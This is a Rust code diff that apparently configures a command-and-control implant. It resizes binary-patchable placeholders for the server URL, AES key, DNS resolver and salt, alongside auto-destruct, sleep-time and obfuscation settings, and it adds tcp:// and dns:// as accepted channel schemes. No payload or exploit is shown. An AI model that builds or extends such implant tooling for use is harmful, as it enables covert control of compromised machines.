@@ -13,15 +13,15 @@ pub const REMOTE_STUB: &str = "REPLACE_ME_URL";
 pub const ENCRYPTION_SALT: &str = "REPLACE_ME_SALT";
 pub const OBFUSCATION_MODE: &str = "REPLACE_ME_OBF";
 
-///服务器 URL 模板 (66 字节)
+///服务器 URL 模板 (64 字节)
 #[no_mangle]
 #[used]
-pub static SERVER_URL_TEMPLATE: [u8; 66] = *b"SYSTEM_CONFIG_DATA_SERVICE_PROVIDER_MAPPING_ENDPOINT_SLOT_00000001";
+pub static SERVER_URL_TEMPLATE: [u8; 64] = *b"SYSTEM_CONFIG_DATA_SERVICE_PROVIDER_MAPPING_ENDPOINT_SLOT_000001";
 
-/// AES-256 密钥模板 (31 字节)
+/// AES-256 密钥模板 (32 字节)
 #[no_mangle]
 #[used]
-pub static AES_KEY_TEMPLATE: [u8; 31] = *b"SYSTEM_CONFIG_DATA_ENCRYPT_BLOB";
+pub static AES_KEY_TEMPLATE: [u8; 32] = *b"SYSTEM_CONFIG_DATA_ENCRYPT_BLOB_";
 
 /// 加密模式
 pub const ENCRYPT_MODE: &str = "AES-GCM";
@@ -41,15 +41,15 @@ pub static AUTO_DESTRUCT_TEMPLATE: [u8; 18] = *b"AD_DATA_BOOL_VAL_N";
 #[used]
 pub static SLEEP_TIME_TEMPLATE: [u8; 16] = *b"ST_DATA_INT_0000";
 
-/// DNS 解析器模板 (31 字节)
+/// DNS 解析器模板 (64 字节)
 #[no_mangle]
 #[used]
-pub static DNS_RESOLVER_TEMPLATE: [u8; 31] = *b"SYSTEM_NETWORK_STUB_RESOLVER_31";
+pub static DNS_RESOLVER_TEMPLATE: [u8; 64] = *b"SYSTEM_NETWORK_STUB_RESOLVER_64_PLACEHOLDER_XXXXXXXXXXXXXXXXXXXX";
 
-/// 加密盐模板 (31 字节)
+/// 加密盐模板 (32 字节)
 #[no_mangle]
 #[used]
-pub static ENCRYPTION_SALT_TEMPLATE: [u8; 31] = *b"SYSTEM_PROVIDER_CRYPTO_KDF_SALT";
+pub static ENCRYPTION_SALT_TEMPLATE: [u8; 32] = *b"SYSTEM_PROVIDER_CRYPTO_KDF_SALT_";
 
 /// 报文混淆模式模板 (15 字节)
 #[no_mangle]
@@ -122,7 +122,7 @@ pub fn get_server_url() -> String {
 /// 
 /// 仅用于 WebSocket 模式下的再次确认，不用于 get_server_url 的初步筛选。
 pub fn validate_server_url(url: &str) -> bool {
-    url.starts_with("ws://") || url.starts_with("wss://")
+    url.starts_with("ws://") || url.starts_with("wss://") || url.starts_with("tcp://") || url.starts_with("dns://")
 }
 
 /// 获取 AES 加密密钥
@@ -178,7 +178,7 @@ pub fn validate_aes_key(key: &[u8]) -> bool {
 /// 获取加密配置信息
 pub fn get_crypto_config_info() -> CryptoConfigInfo {
     let key = get_aes_key();
-    let is_patched = !String::from_utf8_lossy(&AES_KEY_TEMPLATE).contains("DATA_BLOB");
+    let is_patched = !String::from_utf8_lossy(&AES_KEY_TEMPLATE).contains("DATA_ENCRYPT");
     let is_valid = validate_aes_key(&key);
     
     CryptoConfigInfo {
@@ -265,6 +265,7 @@ pub fn get_encryption_salt() -> Vec<u8> {
     // 2. 二进制动态修补
     let template_str = String::from_utf8_lossy(&ENCRYPTION_SALT_TEMPLATE);
     if !template_str.contains("KDF_SALT") {
+        debug!("[+] Using dynamically patched Salt (32 bytes)");
         return ENCRYPTION_SALT_TEMPLATE.to_vec();
     }
     Vec::new()
@@ -331,5 +332,7 @@ mod tests {
     fn test_template_lengths() {
         assert_eq!(SERVER_URL_TEMPLATE.len(), 64);
         assert_eq!(AES_KEY_TEMPLATE.len(), 32); 
+        assert_eq!(DNS_RESOLVER_TEMPLATE.len(), 64);
+        assert_eq!(ENCRYPTION_SALT_TEMPLATE.len(), 32);
     }
 }
